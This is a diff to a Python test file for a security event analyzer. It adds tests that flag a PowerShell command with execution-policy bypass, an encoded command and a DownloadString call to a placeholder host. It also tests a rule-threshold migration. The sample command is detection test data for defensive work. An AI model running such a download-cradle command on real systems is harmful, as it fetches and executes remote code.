@@ -118,7 +118,7 @@ def test_security_event_analyzer_applies_thresholds_and_powershell_indicators(tm
         )
 
     assert [alert.rule_id for alert in alerts] == ["WINDOWS_LOGON_FAILURE"]
-    powershell_alerts = analyzer.process(
+    common_admin_script_alerts = analyzer.process(
         event(
             4104,
             20,
@@ -126,9 +126,37 @@ def test_security_event_analyzer_applies_thresholds_and_powershell_indicators(tm
             command_line="powershell -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA",
         )
     )
+    assert common_admin_script_alerts == []
+
+    powershell_alerts = analyzer.process(
+        event(
+            4104,
+            21,
+            channel="Microsoft-Windows-PowerShell/Operational",
+            command_line="powershell -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA; DownloadString('https://example.invalid/a')",
+        )
+    )
     assert len(powershell_alerts) == 1
     assert powershell_alerts[0].rule_id == "POWERSHELL_SUSPICIOUS"
     assert "encoded-command" in powershell_alerts[0].evidence
+
+
+def test_powershell_default_threshold_migrates_once_without_overwriting_later_tuning(tmp_path):
+    database = Database(tmp_path / "ids.db")
+    database.initialize()
+    with database.connect() as connection:
+        connection.execute("UPDATE rules SET threshold = 2 WHERE id = 'POWERSHELL_SUSPICIOUS'")
+        connection.execute("DELETE FROM settings WHERE key = 'migration_powershell_threshold_v3'")
+
+    database.initialize()
+    migrated = next(rule for rule in RuleRepository(database).list_all() if rule.id == "POWERSHELL_SUSPICIOUS")
+    assert migrated.threshold == 3
+
+    with database.connect() as connection:
+        connection.execute("UPDATE rules SET threshold = 2 WHERE id = 'POWERSHELL_SUSPICIOUS'")
+    database.initialize()
+    retuned = next(rule for rule in RuleRepository(database).list_all() if rule.id == "POWERSHELL_SUSPICIOUS")
+    assert retuned.threshold == 2
 
 
 class StubCollector:
